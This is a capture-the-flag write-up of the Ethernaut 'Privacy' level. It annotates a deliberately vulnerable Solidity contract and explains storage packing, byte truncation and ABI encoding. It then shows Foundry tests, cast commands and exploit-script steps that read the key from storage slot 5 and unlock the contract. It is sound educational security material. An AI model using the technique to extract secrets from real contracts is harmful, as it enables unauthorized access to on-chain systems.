# 12 - Privacy

## 1. Challenge Overview

- **Objective**: Flip `locked` from `true` to `false` by passing the correct `bytes16 _key` into `unlock(bytes16 _key)`.
- **Vulnerability Category**: Cleartext On-Chain Storage / Storage Layout & Byte Truncation (SWC-136).

---

## 2. Annotated Source Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {
    bool public locked = true;                            // SLOT 0 (1 byte; 31 bytes unused)
    uint256 public ID = block.timestamp;                  // SLOT 1 (32 bytes; full slot)

    // SLOT 2 (1 + 1 + 2 = 4 bytes packed right-to-left; 28 bytes unused)
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);

    // SLOTS 3, 4, 5 (fixed-size array: stored sequentially with NO keccak256 pointer)
    // data[0] -> SLOT 3
    // data[1] -> SLOT 4
    // data[2] -> SLOT 5
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }
}
```

---

## 3. Study Notes & Observations

### A. Understanding How Storage Works

- Contract storage is a flat key-value array of $2^{256}$ slots, numbered sequentially starting from **Slot 0**.
- Every slot is strictly **32 bytes (256 bits / 64 hex characters)** wide.
- Eight (8) bits makes up 1 byte.
- Marking a state variable `private` only stops **other contracts** from calling an auto-generated Solidity getter. Every byte in storage is public on the blockchain and can be inspected off-chain using `cast storage <addr> <slot>` or Foundry's `vm.load(addr, slot)`.

### B. Storage Slot Packing & Fixed vs. Dynamic Arrays

When laying out state variables in declaration order, the Solidity compiler follows two rules:

1. If the next variable fits inside the remaining bytes of the current 32-byte slot, Solidity **packs** it into that same slot from **right to left** (least-significant bytes first).
2. If the next variable is larger than the leftover space, Solidity closes the current slot and starts a fresh slot.

Tracing `Privacy` against actual `vm.load` output from `test/12-Privacy.t.sol` (`block.timestamp = 1700001234` = `0x6553f5d2`):

| Slot  | Variable(s)                                   | Sizes                 | Observed `vm.load` Value | Breakdown                                                                                                        |
| :---: | :-------------------------------------------- | :-------------------- | :----------------------- | :--------------------------------------------------------------------------------------------------------------- |
| **0** | `bool public locked`                          | `1 byte`              | `0x...0001`              | `1` (`true`). `uint256 ID` needs 32 bytes and cannot fit in the remaining 31 bytes, so it moves to Slot 1.       |
| **1** | `uint256 public ID`                           | `32 bytes`            | `0x...6553f5d2`          | Full 32-byte slot holding `block.timestamp`.                                                                     |
| **2** | `flattening` + `denomination` + `awkwardness` | `1 + 1 + 2 = 4 bytes` | `0x...f5d2ff0a`          | Packed right-to-left: `0a` (`10`) in byte 0, `ff` (`255`) in byte 1, `f5d2` (`uint16(0x6553f5d2)`) in bytes 2–3. |
| **3** | `data[0]`                                     | `32 bytes`            | `0x...1111`              | First element of fixed-size `bytes32[3]`.                                                                        |
| **4** | `data[1]`                                     | `32 bytes`            | `0x...2222`              | Second element of fixed-size `bytes32[3]`.                                                                       |
| **5** | `data[2]`                                     | `32 bytes`            | `0xaaaa1111...99990000`  | Third element of fixed-size `bytes32[3]` (our target).                                                           |

> [!NOTE]
> **Fixed-Size vs. Dynamic Arrays (`bytes32[3]` vs. `bytes32[]`)**
>
> Initially I expected Slot 3 to hold a pointer to `data`'s elements. However, only **dynamic arrays** (`bytes32[]`) store the array length in the slot and hash the slot index (`keccak256(abi.encode(slot))`) to locate elements elsewhere. Because `bytes32[3]` has a **compile-time fixed length of 3**, Solidity allocates **Slots 3, 4, and 5** directly inline for `data[0]`, `data[1]`, and `data[2]`.

### C. Understanding How Casting Works (`uint` vs. `bytes`)

`Privacy.sol` performs two different narrowing casts, and they truncate from **opposite sides**:

1. **Integer narrowing (`uint256` -> `uint16`)** - Line 11: `uint16(block.timestamp)`
   - Truncates high-order bits on the **left** and keeps the **rightmost (lowest)** bytes (`2^16`).
   - Observed in trace: `0x6553f5d2` -> `0xf5d2`.
2. **Fixed-bytes narrowing (`bytes32` -> `bytes16`)** - Line 24: `bytes16(data[2])`
   - Fixed-size `bytesN` types are left-aligned big-endian sequences. Downcasting keeps the **leftmost (first) 16 bytes** and drops the trailing 16 bytes on the right.
   - Since **1 byte = 2 hex characters**, `bytes16` takes the first **32 hex characters** after `0x`:

```text
Slot 5 (bytes32 = 32 bytes / 64 hex chars):
0x aaaa1111bbbb2222cccc3333dddd4444 eeee5555ffff66667777888899990000
   |------- Left 16 bytes --------| |------- Right 16 bytes -------|
   bytes16(data[2]) keeps this half  dropped during cast to bytes16
```

### D. Understanding How Parameter Parsing Works (`unlock(bytes16 _key)`)

When calling `unlock(bytes16 _key)`, ABI calldata passes arguments in fixed **32-byte words** after the 4-byte function selector:

- Function selector for `unlock(bytes16)`: `0xe1afb08c` (verified with `cast sig "unlock(bytes16)"`).
- Because `bytes16` is a left-aligned fixed byte type, ABI encoding puts the 16-byte key in the **left half** of the 32-byte word and zero-pads the remaining **16 bytes on the right**:

```bash
cast calldata "unlock(bytes16)" 0xaaaa1111bbbb2222cccc3333dddd4444
# 0xe1afb08caaaa1111bbbb2222cccc3333dddd444400000000000000000000000000000000
# |selector| |------- 16-byte _key -------| |----- 16 bytes zero padding -----|
```

When `unlock(bytes16 _key)` parses its input via `CALLDATALOAD(0x04)`, Solidity validates that the lower 16 padding bytes are zero (Solidity 0.8 ABI validation) and loads the left 16 bytes as `_key`.

---

## 4. Exploit Execution & Verification

### Local Foundry Test (`test/12-Privacy.t.sol`)

Verified both the packed Slot 0–5 layout and unlocking via `bytes16(vm.load(..., 5))`:

```bash
forge test --match-contract PrivacyTest -vvvv
```

```text
Ran 2 tests for test/12-Privacy.t.sol:PrivacyTest
[PASS] test_ReadSlot5AndUnlock() (gas: 14438)
Logs:
  Local PoC Success: Leaked key from Slot 5:
  0xaaaa1111bbbb2222cccc3333dddd4444
[PASS] test_StorageSlotLayoutAndPacking() (gas: 15187)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.06ms (536.48µs CPU time)
```

### Live Inspection & Broadcast (`script/12-Privacy.s.sol`)

1. Inspect Slot 5 directly via Cast:

   ```bash
   make storage SLOT=5
   ```

2. Simulate and run the exploit script (loads Slot 5, casts `bytes16(slot5)`, calls `target.unlock(key)`):

   ```bash
   make sim LEVEL=12
   make exploit LEVEL=12
   ```

---

## 5. Key Security Takeaways

1. **`private` is not confidentiality**: Never store passwords, keys, salts, or unencrypted secrets in contract storage or constructor arguments-everything in EVM state and transaction calldata is public.
2. **Use `cast storage` / storage layout mapping when auditing**: Understanding how packing and fixed vs. dynamic arrays map to slots makes it straightforward to inspect any contract's internal state directly off-chain.
3. **Always verify narrowing direction**: `uint` casts truncate from the left (keeping low bytes); `bytesN` casts truncate from the right (keeping leading bytes). Mixing the two up is a common source of signature/hash verification bugs.
